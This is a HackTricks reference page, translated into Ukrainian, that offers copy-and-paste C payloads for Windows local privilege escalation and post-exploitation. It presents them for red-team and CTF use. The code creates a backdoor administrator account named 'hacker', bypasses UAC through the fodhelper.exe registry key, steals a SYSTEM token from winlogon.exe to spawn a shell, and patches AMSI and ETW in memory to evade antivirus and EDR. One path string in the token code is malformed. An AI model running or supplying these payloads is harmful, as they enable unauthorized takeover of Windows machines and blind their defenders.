# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

Ця сторінка збирає **невеликі, самостійні фрагменти C**, які корисні під час підвищення локальних привілеїв Windows або після експлуатації. Кожен payload розроблений так, щоб бути **зручним для копіювання та вставки**, вимагає лише Windows API / C runtime і може бути скомпільований за допомогою `i686-w64-mingw32-gcc` (x86) або `x86_64-w64-mingw32-gcc` (x64).

> ⚠️  Ці payload припускають, що процес вже має мінімальні привілеї, необхідні для виконання дії (наприклад, `SeDebugPrivilege`, `SeImpersonatePrivilege` або контекст середньої цілісності для обходу UAC). Вони призначені для **red-team або CTF налаштувань**, де експлуатація вразливості призвела до виконання довільного рідного коду.

---

## Додати локального адміністратора
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` реєстраційний хід (Середній → Високий рівень)
Коли довірений бінарний файл **`fodhelper.exe`** виконується, він запитує реєстраційний шлях нижче **без фільтрації дієслова `DelegateExecute`**. Посадивши нашу команду під цей ключ, зловмисник може обійти UAC *без* скидання файлу на диск.

*Реєстраційний шлях, запитуваний `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Мінімальний PoC, який відкриває підвищений `cmd.exe`:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Перевірено на Windows 10 22H2 та Windows 11 23H2 (патчі липня 2025 року). Обхід все ще працює, оскільки Microsoft не виправила відсутню перевірку цілісності в шляху `DelegateExecute`.*

---

## Запустіть оболонку SYSTEM через дублювання токена (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Якщо поточний процес має **обидва** привілеї `SeDebug` та `SeImpersonate` (типово для багатьох облікових записів служб), ви можете вкрасти токен з `winlogon.exe`, дублювати його та запустити підвищений процес:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\Windows\\\System32\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Для більш детального пояснення того, як це працює, дивіться:
{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## Патч в пам'яті AMSI та ETW (Уникнення захисту)
Більшість сучасних AV/EDR движків покладаються на **AMSI** та **ETW** для перевірки шкідливих поведінок. Патчинг обох інтерфейсів на ранньому етапі в поточному процесі запобігає скануванню скриптових вантажів (наприклад, PowerShell, JScript).
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*Виправлення вище є локальним для процесу; запуск нового PowerShell після його виконання буде виконуватись без перевірки AMSI/ETW.*

---

## Посилання
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)

{{#include ../../banners/hacktricks-training.md}}
